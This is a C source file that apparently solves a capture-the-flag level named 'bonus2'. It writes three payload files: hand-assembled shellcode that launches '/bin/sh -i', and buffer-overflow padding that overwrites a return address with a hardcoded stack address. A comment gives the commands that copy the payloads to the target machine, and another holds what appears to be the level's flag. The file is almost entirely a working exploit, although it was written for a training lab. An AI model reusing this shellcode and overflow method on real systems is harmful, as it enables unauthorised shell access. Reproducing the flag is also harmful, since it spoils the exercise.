#include <unistd.h>
#include <stdio.h>

//gcc script.c && ./a.out && scp -P 4242 payload_fi payload_nl payload_b2 bonus2@192.168.56.102:/tmp
//579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245

int main() {
	int asm_size = 1 + 4 + 15;
	int asm_address = 0xbfffff3b - (asm_size + 10);
	int bin_sh_address = asm_address + asm_size;

	FILE *file = fopen("payload_b2", "w");
	//for (int i = 0; i < 0x100; ++i)
	//	fputc('B', file);
	fwrite((char[1]){0x68}, 1, 1, file);
	fwrite(&bin_sh_address, 1, 4, file);
	fwrite((char[15]){0xb8, 0x5f, 0xb0, 0xe6, 0xb7, 0x40, 0xff, 0xd0, 0x31, 0xc0, 0x40, 0x31, 0xdb, 0xcd, 0x80}, 1, 15, file);
	fprintf(file, "/bin/sh -i");
	fclose(file);

	file = fopen("payload_fi", "w");
	for (int i = 0; i < 32; ++i)
		fputc('B', file);
	fseek(file, 18, SEEK_SET);
	fwrite(&asm_address, 1, 4, file);
	fclose(file);

	file = fopen("payload_nl", "w");
	for (int i = 0; i < 32; ++i)
		fputc('B', file);
	fseek(file, 23, SEEK_SET);
	fwrite(&asm_address, 1, 4, file);
	fclose(file);
}